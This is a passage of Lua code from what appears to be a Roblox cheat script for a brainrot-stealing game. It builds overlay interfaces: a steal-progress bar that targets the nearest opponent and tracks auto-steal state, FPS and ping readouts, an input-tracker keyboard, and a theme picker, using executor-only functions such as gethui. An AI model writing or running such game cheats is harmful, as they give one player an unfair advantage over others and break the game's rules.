                local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
                if not root then return nil end
                local best, bestD = nil, 1e9
                for _, plr in ipairs(Players:GetPlayers()) do
                    if plr ~= LP and plr.Character then
                        local r = plr.Character:FindFirstChild("HumanoidRootPart")
                        local h = plr.Character:FindFirstChildOfClass("Humanoid")
                        if r and h and h.Health > 0 then
                            local d = (r.Position - root.Position).Magnitude
                            if d < bestD then bestD, best = d, plr end
                        end
                    end
                end
                return best
            end
            local function getBrainrotTool()
                local char = LP.Character
                if not char then return nil end
                for _, obj in ipairs(char:GetChildren()) do
                    if obj:IsA("Tool") then
                        local n = string.lower(obj.Name)
                        if not (n:find("bat",1,true) or n:find("slap",1,true) or n:find("medusa",1,true)) then
                            return obj
                        end
                    end
                end
                for _, obj in ipairs(char:GetChildren()) do
                    if obj:IsA("Model") or obj:IsA("Folder") then
                        local n = string.lower(obj.Name)
                        if n:find("brainrot",1,true) or n:find("animal",1,true) or n:find("pet",1,true) then
                            return obj
                        end
                    end
                end
                return nil
            end
            while stealBarFrame and stealBarFrame.Parent and myGen == _stealBarGeneration do
                local opp = getOpp()
                if opp then
                    oppDisplay.Text = tostring(opp.DisplayName or opp.Name)
                    oppUser.Text = "@" .. tostring(opp.Name)
                    pcall(function()
                        oppAvatar.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(opp.UserId) .. "&w=150&h=150"
                    end)
                else
                    oppDisplay.Text = "No opponent"
                    oppUser.Text = "@---"
                    oppAvatar.Image = ""
                end
                local nm, tex = nil, ""
                pcall(function() nm, tex = getStealTargetInfo() end)
                if nm and nm ~= "" then
                    brName.Text = tostring(nm)
                    brIcon.Image = tex or ""
                    brIcon.ImageTransparency = 0
                    if not tex or tex == "" then
                        brIcon.BackgroundColor3 = ACCENT_COLOR
                        brIcon.BackgroundTransparency = 0.3
                    else
                        brIcon.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
                        brIcon.BackgroundTransparency = 0
                    end
                else
                    brName.Text = "No brainrot"
                    brIcon.Image = ""
                    brIcon.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
                    brIcon.BackgroundTransparency = 0
                end
                task.wait(0.35)
            end
        end)
    else
        stealLbl=Instance.new("TextLabel",stealBarFrame)
        stealLbl.Size=UDim2.new(0.34,0,1,0)
        stealLbl.BackgroundTransparency=1
        stealLbl.Font=Enum.Font.GothamBold
        stealLbl.Text="STEAL 0%"
        stealLbl.TextSize=13
        stealLbl.TextColor3=Color3.fromRGB(255,255,255)
        stealLbl.ZIndex=26

        fpsLbl=Instance.new("TextLabel",stealBarFrame)
        fpsLbl.Size=UDim2.new(0.33,0,1,0)
        fpsLbl.Position=UDim2.new(0.34,0,0,0)
        fpsLbl.BackgroundTransparency=1
        fpsLbl.Font=Enum.Font.Gotham
        fpsLbl.Text="FPS: --"
        fpsLbl.TextSize=12
        fpsLbl.TextColor3=Color3.fromRGB(200,200,210)
        fpsLbl.ZIndex=26

        pingLbl=Instance.new("TextLabel",stealBarFrame)
        pingLbl.Size=UDim2.new(0.33,0,1,0)
        pingLbl.Position=UDim2.new(0.67,0,0,0)
        pingLbl.BackgroundTransparency=1
        pingLbl.Font=Enum.Font.Gotham
        pingLbl.Text="PING: --"
        pingLbl.TextSize=12
        pingLbl.TextColor3=Color3.fromRGB(200,200,210)
        pingLbl.ZIndex=26

        local function softShimmer(lbl)
            local g=Instance.new("UIGradient",lbl)
            g.Color=ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.fromRGB(255,255,255)),
                ColorSequenceKeypoint.new(0.4, ACCENT_COLOR),
                ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255,255,255)),
                ColorSequenceKeypoint.new(0.6, ACCENT_COLOR),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(255,255,255)),
            })
            registerAccentHook(function(a)
                g.Color=ColorSequence.new({
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(255,255,255)),
                    ColorSequenceKeypoint.new(0.4, a),
                    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255,255,255)),
                    ColorSequenceKeypoint.new(0.6, a),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(255,255,255)),
                })
            end, lbl)
            task.spawn(function()
                local t=0
                while g and g.Parent and myGen == _stealBarGeneration do
                    t=t+0.05
                    g.Offset=Vector2.new(math.sin(t)*0.35,0)
                    task.wait(0.05)
                end
            end)
        end
        softShimmer(stealLbl)
    end

    task.spawn(function()
        local frames, t0 = 0, tick()
        local lastFps, lastPing = 0, 0
        local conn
        conn = RunService.RenderStepped:Connect(function()
            if myGen ~= _stealBarGeneration then
                if conn then conn:Disconnect() end
                return
            end
            if not ((fpsLbl and fpsLbl.Parent) or (pingLbl and pingLbl.Parent)) then
                if conn then conn:Disconnect() end
                return
            end
            frames = frames + 1
            local now = tick()
            if now - t0 >= 0.5 then
                lastFps = math.floor(frames / (now - t0) + 0.5)
                frames, t0 = 0, now
                pcall(function()
                    lastPing = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
                end)
                if style == 4 then
                    if fpsLbl and fpsLbl.Parent then
                        fpsLbl.Text = string.format("FPS %d\nPING %dms", lastFps, lastPing)
                        if lastPing < 80 then fpsLbl.TextColor3 = Color3.fromRGB(0, 255, 120)
                        elseif lastPing < 150 then fpsLbl.TextColor3 = Color3.fromRGB(255, 200, 0)
                        else fpsLbl.TextColor3 = Color3.fromRGB(255, 60, 60) end
                    end
                else
                    if fpsLbl and fpsLbl.Parent and fpsLbl ~= pingLbl then
                        fpsLbl.Text = "FPS: " .. tostring(lastFps)
                    end
                    if pingLbl and pingLbl.Parent then
                        if lastPing < 80 then pingLbl.TextColor3 = Color3.fromRGB(0, 255, 120)
                        elseif lastPing < 150 then pingLbl.TextColor3 = Color3.fromRGB(255, 200, 0)
                        else pingLbl.TextColor3 = Color3.fromRGB(255, 60, 60) end
                        pingLbl.Text = "PING: " .. tostring(lastPing) .. "ms"
                    end
                end
            end
        end)
    end)

    task.spawn(function()
        local displayPct = 0
        local lastT = tick()
        while stealBarFrame and stealBarFrame.Parent and myGen == _stealBarGeneration do
            local now = tick()
            local dt = math.clamp(now - lastT, 0, 0.1)
            lastT = now
            local targetPct = 0
            if Steal.AutoStealEnabled then
                if stealMode == "semi" then
                    if SemiSteal and SemiSteal.State and SemiSteal.State.active and SemiSteal.State.startTime then
                        if SemiSteal.State.inRange then
                            local holdMax = (SemiSteal.CONFIG and SemiSteal.CONFIG.HOLD_MAX) or Steal.StealDuration or 1.4
                            targetPct = math.clamp((now - SemiSteal.State.startTime) / holdMax, 0, 1)
                        else
                            targetPct = 0
                        end
                    end
                else
                    local nearPrompt = nil
                    pcall(function() nearPrompt = findNearestPrompt() end)
                    local inRadius = nearPrompt ~= nil
                    if isStealing and stealStartTime then
                        if inRadius then
                            targetPct = math.clamp((now - stealStartTime) / (Steal.StealDuration or 1.4), 0, 1)
                        else
                            targetPct = 0
                        end
                    end
                end
            end
            local speed = (targetPct < displayPct) and 5 or 14
            displayPct = displayPct + (targetPct - displayPct) * math.clamp(dt * speed, 0, 1)
            if math.abs(displayPct - targetPct) < 0.005 then displayPct = targetPct end
            local pctInt = math.floor(displayPct * 100 + 0.5)
            if style == 2 then
                if pctLbl and pctLbl.Parent then pctLbl.Text = tostring(pctInt) .. "%" end
            else
                if stealLbl and stealLbl.Parent then stealLbl.Text = "STEAL " .. pctInt .. "%" end
            end
            if style == 4 then
                local p = math.clamp(displayPct, 0, 1)
                if stealLbl and stealLbl.Parent then
                    stealLbl.Text = "STEAL  " .. math.floor(p * 100 + 0.5) .. "%"
                end
                if _stealBarOpt4Neon and _stealBarOpt4Neon.Parent then
                    _stealBarOpt4Neon.Size = UDim2.new(p, 0, 1, 0)
                end
                if _stealBarOpt4Tip and _stealBarOpt4Tip.Parent then
                    if p > 0.02 then
                        _stealBarOpt4Tip.Visible = true
                        _stealBarOpt4Tip.Position = UDim2.new(p, 0, 0.5, 0)
                    else
                        _stealBarOpt4Tip.Visible = false
                    end
                end
            elseif style == 3 then
                local p = math.clamp(displayPct, 0, 1)
                local segs = _stealBarOpt3Segs
                local tip = _stealBarOpt3Tip
                local n = _stealBarOpt3SegN or 0
                if segs and n > 0 then
                    local lit = math.floor(p * n + 1e-6)
                    for i = 1, n do
                        local seg = segs[i]
                        if seg and seg.Parent then
                            if i <= lit then
                                seg:SetAttribute("On", true)
                                seg.BackgroundColor3 = ACCENT_COLOR
                                seg.BackgroundTransparency = 0
                            else
                                seg:SetAttribute("On", false)
                                seg.BackgroundColor3 = Color3.fromRGB(28, 32, 42)
                                seg.BackgroundTransparency = 0.15
                            end
                        end
                    end
                    if tip and tip.Parent then
                        if p > 0.02 and p < 0.99 then
                            tip.Visible = true
                            tip.Position = UDim2.new(p, -5, 0, -1)
                            tip.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                        else
                            tip.Visible = p >= 0.99
                            if p >= 0.99 then tip.Position = UDim2.new(1, -10, 0, -1) end
                        end
                    end
                end
            elseif fillLine and fillLine.Parent and myGen == _stealBarGeneration then
                local p = math.clamp(displayPct, 0, 1)
                fillLine.Size = UDim2.new(p, 0, 1, 0)
            end
            -- lighter on mobile
            if UIS and UIS.TouchEnabled then
                task.wait(0.033)
            else
                task.wait(0.016)
            end
        end
    end)

    applyStealBarPosition()

    local barDragging, barDragStart, barStartPos = false, nil, nil
    stealBarFrame.InputBegan:Connect(function(input)
        if stealBarPos ~= "CUSTOM" then return end
        if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
            barDragging=true
            barDragStart=input.Position
            barStartPos=stealBarFrame.Position
            local ended
            ended = input.Changed:Connect(function()
                if input.UserInputState==Enum.UserInputState.End then
                    barDragging=false
                    if ended then ended:Disconnect() end
                    local vp = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920,1080)
                    local abs = stealBarFrame.AbsolutePosition
                    stealBarCustomX = math.clamp((abs.X + SB_W/2) / vp.X, 0, 1)
                    stealBarCustomY = math.clamp(abs.Y / vp.Y, 0, 1)
                    applyStealBarPosition()
                    if saveConfig then pcall(saveConfig) end
                end
            end)
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if not barDragging then return end
        if input.UserInputType==Enum.UserInputType.MouseMovement or input.UserInputType==Enum.UserInputType.Touch then
            local delta=input.Position-barDragStart
            stealBarFrame.Position = UDim2.new(
                barStartPos.X.Scale, barStartPos.X.Offset + delta.X,
                barStartPos.Y.Scale, barStartPos.Y.Offset + delta.Y
            )
            stealBarFrame.Visible = true
        end
    end)
end

createStealBar()

lockButtonRef = nil
lockButtonFrameRef = nil

function updateLockButton()
    if lockButtonRef then
        lockButtonRef.Text = mobileButtonsLocked and "🔒" or "🔓"
        if lockButtonFrameRef then
            local scaleGoal = mobileButtonsLocked and 1.2 or 1.0
            local colorGoal = mobileButtonsLocked and Color3.fromRGB(40,40,45) or Color3.fromRGB(10,10,10)
            TweenService:Create(lockButtonFrameRef, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                BackgroundColor3 = colorGoal,
                Size = UDim2.new(0, 32 * scaleGoal, 0, 32 * scaleGoal)
            }):Play()
        end
    end
    if setLockVisual then
        pcall(function() setLockVisual(mobileButtonsLocked) end)
    end
end

function destroyMobileButtons()
    if mobGuiRef then pcall(function() mobGuiRef:Destroy() end);mobGuiRef=nil end
    for _,n in ipairs({"OceanMobileButtons","MoveeMobileButtons"}) do
        pcall(function()
            local pgui=LP:FindFirstChild("PlayerGui")
            if pgui then local o=pgui:FindFirstChild(n);if o then o:Destroy() end end
        end)
        pcall(function()
            if gethui then
                local h=gethui(); local o=h and h:FindFirstChild(n)
                if o then o:Destroy() end
            end
        end)
        pcall(function()
            local cg=game:GetService("CoreGui"); local old=cg:FindFirstChild(n); if old then old:Destroy() end
        end)
    end
    mobBtnRefs={}
    lockButtonRef = nil
    lockButtonFrameRef = nil
end


function destroyTracker()
    pcall(function() if _trackerGui then _trackerGui:Destroy() end end)
    _trackerGui = nil
    if _trackerInputConn then pcall(function() _trackerInputConn:Disconnect() end); _trackerInputConn=nil end
    if _trackerInputEndConn then pcall(function() _trackerInputEndConn:Disconnect() end); _trackerInputEndConn=nil end
end
function buildTracker()
    destroyTracker()
    if not trackerEnabled then return end
    local scale = math.clamp(tonumber(trackerScale) or 1, 0.45, 2.5)
    local mode = tostring(trackerMode or "keyboard"):lower()
    local ACC = ACCENT_COLOR or Color3.fromRGB(56, 140, 255)
    local WHITE = Color3.fromRGB(255, 255, 255)
    local KEY_EDGE = Color3.fromRGB(18, 19, 22)
    local KEY_TOP = Color3.fromRGB(52, 54, 62)
    local KEY_TOP2 = Color3.fromRGB(62, 64, 72)
    local BOARD = Color3.fromRGB(16, 17, 20)

    local sg = Instance.new("ScreenGui")
    sg.Name = "OceanTracker"
    sg.ResetOnSpawn = false
    sg.IgnoreGuiInset = true
    sg.DisplayOrder = 200000
    parentGui(sg)
    _trackerGui = sg

    local BASE_W = (mode == "controller") and 360 or 720
    local BASE_H = (mode == "controller") and 240 or 310
    local root = Instance.new("Frame", sg)
    root.Name = "Console"
    root.AnchorPoint = Vector2.new(0.5, 0.5)
    root.Size = UDim2.fromOffset(BASE_W, BASE_H)
    root.BackgroundColor3 = BOARD
    root.BorderSizePixel = 0
    root.Active = true
    Instance.new("UICorner", root).CornerRadius = UDim.new(0, 16)
    local rst = Instance.new("UIStroke", root)
    rst.Color = Color3.fromRGB(70, 72, 80)
    rst.Thickness = 2
    local us = Instance.new("UIScale", root)
    us.Scale = scale

    local accentBar = Instance.new("Frame", root)
    accentBar.Size = UDim2.new(1, 0, 0, 3)
    accentBar.BackgroundColor3 = ACC
    accentBar.BorderSizePixel = 0
    pcall(function() if registerAccentHook then registerAccentHook(function(a) accentBar.BackgroundColor3 = a end, accentBar) end end)

    local title = Instance.new("TextLabel", root)
    title.BackgroundTransparency = 1
    title.Position = UDim2.fromOffset(14, 10)
    title.Size = UDim2.new(0.6, 0, 0, 16)
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 11
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.TextColor3 = Color3.fromRGB(210, 215, 225)
    title.Text = (mode == "controller") and "CONTROLLER" or "KEYBOARD"

    local led = Instance.new("Frame", root)
    led.Size = UDim2.fromOffset(8, 8)
    led.Position = UDim2.new(1, -22, 0, 14)
    led.BackgroundColor3 = ACC
    led.BorderSizePixel = 0
    Instance.new("UICorner", led).CornerRadius = UDim.new(1, 0)
    pcall(function() if registerAccentHook then registerAccentHook(function(a) led.BackgroundColor3 = a end, led) end end)

    local keyMap = {}
    local function styleKey(f, label)
        f.BackgroundColor3 = KEY_EDGE
        f.BorderSizePixel = 0
        Instance.new("UICorner", f).CornerRadius = UDim.new(0, 7)
        local sh = Instance.new("Frame", f)
        sh.Size = UDim2.new(1, 0, 1, 0)
        sh.Position = UDim2.fromOffset(0, 2)
        sh.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        sh.BackgroundTransparency = 0.55
        sh.BorderSizePixel = 0
        Instance.new("UICorner", sh).CornerRadius = UDim.new(0, 7)
        local cap = Instance.new("Frame", f)
        cap.Name = "Cap"
        cap.Size = UDim2.new(1, -4, 1, -5)
        cap.Position = UDim2.fromOffset(2, 1)
        cap.BackgroundColor3 = KEY_TOP
        cap.BorderSizePixel = 0
        cap.ZIndex = 2
        Instance.new("UICorner", cap).CornerRadius = UDim.new(0, 6)
        local gloss = Instance.new("Frame", cap)
        gloss.Size = UDim2.new(1, 0, 0.42, 0)
        gloss.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        gloss.BackgroundTransparency = 0.88
        gloss.BorderSizePixel = 0
        gloss.ZIndex = 3
        Instance.new("UICorner", gloss).CornerRadius = UDim.new(0, 6)
        local lbl = Instance.new("TextLabel", cap)
        lbl.BackgroundTransparency = 1
        lbl.Size = UDim2.fromScale(1, 1)
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 12
        lbl.TextColor3 = WHITE
        lbl.Text = label
        lbl.ZIndex = 4
    end
    local function lightKey(code, on)
        local f = keyMap[code]
        if not f then return end
        local cap = f:FindFirstChild("Cap")
        local goalEdge = on and ACC or KEY_EDGE
        local goalCap = on and ACC or KEY_TOP
        pcall(function()
            TweenService:Create(f, TweenInfo.new(0.06, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = goalEdge}):Play()
            if cap then
                TweenService:Create(cap, TweenInfo.new(0.06, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = goalCap}):Play()
            end
        end)
    end

    if mode == "controller" then
        local function k(code, label, x, y, w, h)
            local f = Instance.new("Frame", root)
            f.Position = UDim2.fromOffset(x, y)
            f.Size = UDim2.fromOffset(w or 38, h or 30)
            styleKey(f, label)
            keyMap[code] = f
        end
        k("ButtonL1", "L1", 30, 40, 52, 24); k("ButtonR1", "R1", 278, 40, 52, 24)
        k("ButtonL2", "L2", 30, 68, 52, 24); k("ButtonR2", "R2", 278, 68, 52, 24)
        k("DPadUp", "↑", 62, 110, 34, 30); k("DPadLeft", "←", 30, 140, 34, 30)
        k("DPadRight", "→", 94, 140, 34, 30); k("DPadDown", "↓", 62, 170, 34, 30)
        k("ButtonY", "Y", 268, 110, 36, 30); k("ButtonX", "X", 236, 140, 36, 30)
        k("ButtonB", "B", 300, 140, 36, 30); k("ButtonA", "A", 268, 170, 36, 30)
        k("ButtonL3", "L3", 140, 165, 38, 30); k("ButtonR3", "R3", 186, 165, 38, 30)
        k("ButtonSelect", "VIEW", 140, 110, 42, 26); k("ButtonStart", "MENU", 186, 110, 42, 26)
    else
        local function place(code, label, x, y, w, h)
            local f = Instance.new("Frame", root)
            f.Position = UDim2.fromOffset(x, y)
            f.Size = UDim2.fromOffset(w or 36, h or 26)
            styleKey(f, label)
            keyMap[code] = f
        end
        -- Row 0: Esc + F1-F12
        place("Escape", "Esc", 10, 34, 40, 24)
        local fKeys = {"F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"}
        for i, fk in ipairs(fKeys) do
            place(fk, fk, 58 + (i-1)*52, 34, 48, 24)
        end
        -- Row 1: ` 1-0 - = Backspace
        place("Backquote", "`", 10, 64, 36, 26)
        local nums = {{"One","1"},{"Two","2"},{"Three","3"},{"Four","4"},{"Five","5"},{"Six","6"},{"Seven","7"},{"Eight","8"},{"Nine","9"},{"Zero","0"},{"Minus","-"},{"Equals","="}}
        for i, p in ipairs(nums) do place(p[1], p[2], 50 + (i-1)*40, 64, 36, 26) end
        place("BackSpace", "Bksp", 530, 64, 70, 26)
        -- Row 2: Tab QWERTY
        place("Tab", "Tab", 10, 96, 50, 26)
        local r2 = {"Q","W","E","R","T","Y","U","I","O","P"}
        for i, c in ipairs(r2) do place(c, c, 64 + (i-1)*40, 96, 36, 26) end
        place("LeftBracket", "[", 464, 96, 36, 26)
        place("RightBracket", "]", 504, 96, 36, 26)
        place("BackSlash", "\\", 544, 96, 56, 26)
        -- Row 3: Caps A-L
        place("CapsLock", "Caps", 10, 128, 60, 26)
        local r3 = {"A","S","D","F","G","H","J","K","L"}
        for i, c in ipairs(r3) do place(c, c, 74 + (i-1)*40, 128, 36, 26) end
        place("Semicolon", ";", 434, 128, 36, 26)
        place("Quote", "'", 474, 128, 36, 26)
        place("Return", "Enter", 514, 128, 86, 26)
        -- Row 4: Shift Z-M
        place("LeftShift", "Shift", 10, 160, 76, 26)
        local r4 = {"Z","X","C","V","B","N","M"}
        for i, c in ipairs(r4) do place(c, c, 90 + (i-1)*40, 160, 36, 26) end
        place("Comma", ",", 370, 160, 36, 26)
        place("Period", ".", 410, 160, 36, 26)
        place("Slash", "/", 450, 160, 36, 26)
        place("RightShift", "Shift", 490, 160, 110, 26)
        -- Row 5: Ctrl Alt Space arrows
        place("LeftControl", "Ctrl", 10, 192, 50, 26)
        place("LeftAlt", "Alt", 64, 192, 44, 26)
        place("Space", "SPACE", 114, 192, 280, 26)
        place("RightAlt", "Alt", 400, 192, 44, 26)
        place("RightControl", "Ctrl", 448, 192, 50, 26)
        place("Left", "←", 510, 192, 28, 26)
        place("Up", "↑", 542, 178, 28, 22)
        place("Down", "↓", 542, 202, 28, 22)
        place("Right", "→", 574, 192, 28, 26)
        place("Insert", "Ins", 620, 64, 40, 24)
        place("Delete", "Del", 664, 64, 40, 24)
        place("Home", "Hm", 620, 96, 40, 24)
        place("End", "End", 664, 96, 40, 24)
        place("PageUp", "Pu", 620, 128, 40, 24)
        place("PageDown", "Pd", 664, 128, 40, 24)
    end

    root.Position = UDim2.new(tonumber(trackerPosSX) or 0.5, tonumber(trackerPosOX) or 0, tonumber(trackerPosSY) or 0.72, tonumber(trackerPosOY) or 0)
    pcall(function()
        if trackerBgEnabled then
            root.BackgroundTransparency = 0.15
            local img = root:FindFirstChild("TrackerBgImage")
            if not img then
                img = Instance.new("ImageLabel")
                img.Name = "TrackerBgImage"
                img.Size = UDim2.fromScale(1, 1)
                img.BackgroundTransparency = 1
                img.ZIndex = 0
                img.ScaleType = Enum.ScaleType.Crop
                img.Parent = root
            end
            local id = tostring(customBgId or ""):gsub("%s+",""):gsub("rbxassetid://","")
            img.Image = "rbxassetid://" .. id
            img.ImageTransparency = 0.35
            img.Visible = true
        else
            local img = root:FindFirstChild("TrackerBgImage")
            if img then img.Visible = false end
        end
    end)
    local dragging, d0, p0
    root.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true; d0 = input.Position; p0 = root.Position
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if not dragging then return end
        if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then return end
        local d = input.Position - d0
        root.Position = UDim2.new(p0.X.Scale, p0.X.Offset + d.X, p0.Y.Scale, p0.Y.Offset + d.Y)
    end)
    UIS.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            if dragging then
                dragging = false
                trackerPosSX, trackerPosOX = root.Position.X.Scale, root.Position.X.Offset
                trackerPosSY, trackerPosOY = root.Position.Y.Scale, root.Position.Y.Offset
                if saveConfig then pcall(saveConfig) end
            end
        end
    end)
    _trackerInputConn = UIS.InputBegan:Connect(function(input)
        if input.KeyCode and input.KeyCode ~= Enum.KeyCode.Unknown then
            lightKey(input.KeyCode.Name, true)
        end
    end)
    _trackerInputEndConn = UIS.InputEnded:Connect(function(input)
        if input.KeyCode and input.KeyCode ~= Enum.KeyCode.Unknown then
            lightKey(input.KeyCode.Name, false)
        end
    end)
end
function setTrackerEnabled(on)
    trackerEnabled = on and true or false
    if trackerEnabled then buildTracker() else destroyTracker() end
    if saveConfig then pcall(saveConfig) end
end

function destroyStudioPopup()
    pcall(function()
        if _studioPopupGui and _studioPopupGui.Parent then _studioPopupGui:Destroy() end
    end)
    _studioPopupGui = nil
end

local function createStudioShell(titleText, width, height)
    destroyStudioPopup()
    local sg = Instance.new("ScreenGui")
    sg.Name = "OceanStudioPopup"
    sg.ResetOnSpawn = false
    sg.IgnoreGuiInset = true
    sg.DisplayOrder = 300000
    sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    parentGui(sg)
    _studioPopupGui = sg

    local ACC = ACCENT_COLOR or Color3.fromRGB(56, 140, 255)
    local panel = Instance.new("Frame", sg)
    panel.Name = "Panel"
    panel.AnchorPoint = Vector2.new(0.5, 0.5)
    panel.Position = UDim2.fromScale(0.5, 0.5)
    panel.Size = UDim2.fromOffset(width or 320, height or 420)
    panel.BackgroundColor3 = Color3.fromRGB(12, 12, 14)
    panel.BorderSizePixel = 0
    panel.Active = true
    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 16)
    local stroke = Instance.new("UIStroke", panel)
    stroke.Color = ACC
    stroke.Thickness = 1.6
    stroke.Transparency = 0.15
    pcall(function() if registerAccentHook then registerAccentHook(function(a) stroke.Color = a end, panel) end end)

    local title = Instance.new("TextLabel", panel)
    title.BackgroundTransparency = 1
    title.Position = UDim2.fromOffset(16, 12)
    title.Size = UDim2.new(1, -56, 0, 24)
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 16
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.TextColor3 = Color3.fromRGB(245, 245, 250)
    title.Text = titleText or "Studio"

    local close = Instance.new("TextButton", panel)
    close.Size = UDim2.fromOffset(28, 28)
    close.Position = UDim2.new(1, -36, 0, 10)
    close.BackgroundColor3 = Color3.fromRGB(28, 28, 32)
    close.Text = "X"
    close.Font = Enum.Font.GothamBold
    close.TextSize = 14
    close.TextColor3 = Color3.fromRGB(220, 220, 230)
    close.BorderSizePixel = 0
    close.AutoButtonColor = false
    Instance.new("UICorner", close).CornerRadius = UDim.new(0, 8)
    close.MouseButton1Click:Connect(destroyStudioPopup)

    -- drag whole panel
    do
        local dragging, d0, p0
        panel.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true; d0 = input.Position; p0 = panel.Position
            end
        end)
        UIS.InputChanged:Connect(function(input)
            if not dragging then return end
            if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then return end
            local d = input.Position - d0
            panel.Position = UDim2.new(p0.X.Scale, p0.X.Offset + d.X, p0.Y.Scale, p0.Y.Offset + d.Y)
        end)
        UIS.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = false
            end
        end)
    end

    local body = Instance.new("ScrollingFrame", panel)
    body.Name = "Body"
    body.BackgroundTransparency = 1
    body.Position = UDim2.fromOffset(12, 44)
    body.Size = UDim2.new(1, -24, 1, -56)
    body.BorderSizePixel = 0
    body.ScrollBarThickness = 4
    body.ScrollBarImageColor3 = ACC
    body.CanvasSize = UDim2.fromOffset(0, 0)
    body.AutomaticCanvasSize = Enum.AutomaticSize.Y
    local lay = Instance.new("UIListLayout", body)
    lay.SortOrder = Enum.SortOrder.LayoutOrder
    lay.Padding = UDim.new(0, 8)
    return panel, body, ACC
end

function openBatThemesStudio()
    local panel, body, ACC = createStudioShell("Bat Themes", 320, 480)
    local order = BAT_THEME_ORDER or {}
    local currentLbl = Instance.new("TextLabel", body)
    currentLbl.Size = UDim2.new(1, 0, 0, 18)
    currentLbl.BackgroundTransparency = 1
    currentLbl.Font = Enum.Font.GothamBold
    currentLbl.TextSize = 12
    currentLbl.TextXAlignment = Enum.TextXAlignment.Left
    currentLbl.TextColor3 = Color3.fromRGB(160, 165, 180)
    currentLbl.Text = "Current: " .. tostring(batThemeMode or "Normal")
    currentLbl.LayoutOrder = 0

    local function makeBatPreview(parent, theme, size)
        local wrap = Instance.new("Frame", parent)
        wrap.Size = UDim2.fromOffset(size, size)
        wrap.Position = UDim2.fromOffset(8, math.floor((44 - size) / 2))
        wrap.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
        wrap.BorderSizePixel = 0
        Instance.new("UICorner", wrap).CornerRadius = UDim.new(0, 8)
        local col = (theme and theme.color) or Color3.fromRGB(90, 90, 100)
        local handle = Instance.new("Frame", wrap)
        handle.AnchorPoint = Vector2.new(0.5, 0)
        handle.Position = UDim2.new(0.5, 0, 0.10, 0)
        handle.Size = UDim2.new(0, math.max(4, math.floor(size * 0.18)), 0, math.floor(size * 0.52))
        handle.BackgroundColor3 = col
        handle.BorderSizePixel = 0
        Instance.new("UICorner", handle).CornerRadius = UDim.new(1, 0)
        local head = Instance.new("Frame", wrap)
        head.AnchorPoint = Vector2.new(0.5, 0)
        head.Position = UDim2.new(0.5, 0, 0.52, 0)
        head.Size = UDim2.new(0, math.floor(size * 0.72), 0, math.floor(size * 0.34))
        head.BackgroundColor3 = col
        head.BorderSizePixel = 0
        Instance.new("UICorner", head).CornerRadius = UDim.new(0, 6)
        if theme and theme.useAvatar then
            local img = Instance.new("ImageLabel", head)
            img.BackgroundTransparency = 1
            img.Size = UDim2.fromScale(1, 1)
            img.ScaleType = Enum.ScaleType.Crop
            pcall(function()
                local thumb = resolveBatThemeThumb and resolveBatThemeThumb()
                if thumb then img.Image = thumb end
            end)
            Instance.new("UICorner", img).CornerRadius = UDim.new(0, 6)
        end
        if theme and theme.material == Enum.Material.Neon then
            local glow = Instance.new("UIStroke", head)
            glow.Color = col
            glow.Thickness = 2
            glow.Transparency = 0.35
        end
        return wrap
    end

    for i, name in ipairs(order) do
        local theme = BAT_TOOL_THEMES and BAT_TOOL_THEMES[name]
        local row = Instance.new("TextButton", body)
        row.Size = UDim2.new(1, 0, 0, 44)
        row.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
        row.BorderSizePixel = 0
        row.AutoButtonColor = false
        row.Text = ""
        row.LayoutOrder = i
        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 10)
        makeBatPreview(row, theme, 32)
        local lbl = Instance.new("TextLabel", row)
        lbl.BackgroundTransparency = 1
        lbl.Position = UDim2.fromOffset(48, 0)
        lbl.Size = UDim2.new(1, -90, 1, 0)
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 13
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.TextColor3 = Color3.fromRGB(235, 235, 240)
        lbl.Text = name
        local check = Instance.new("TextLabel", row)
        check.Name = "Check"
        check.BackgroundTransparency = 1
        check.Position = UDim2.new(1, -36, 0, 0)
        check.Size = UDim2.fromOffset(28, 44)
        check.Font = Enum.Font.GothamBlack
        check.TextSize = 16
        check.TextColor3 = ACC
